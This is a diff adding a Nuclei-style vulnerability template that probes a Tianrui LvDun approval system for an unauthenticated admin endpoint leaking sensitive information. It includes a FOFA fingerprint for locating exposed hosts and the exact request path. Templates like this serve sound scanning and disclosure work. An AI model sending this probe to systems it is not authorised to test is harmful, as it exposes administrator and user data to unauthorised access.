@@ -1,0 +1,21 @@
+id: poc-oscr1oec3wgyzmf1
+info:
+  name: 天锐绿盾审批系统 admin 未授权访问致敏感信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oscr1oec3wgyzmf1'
+  tags: info-leak,unauth,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: oscr1oec3wgyzmf1
+    fofa: app="TIPPAY-绿盾审批系统"
+http:
+- raw:
+  - 'GET /trwfe/ws/identity/user/admin HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
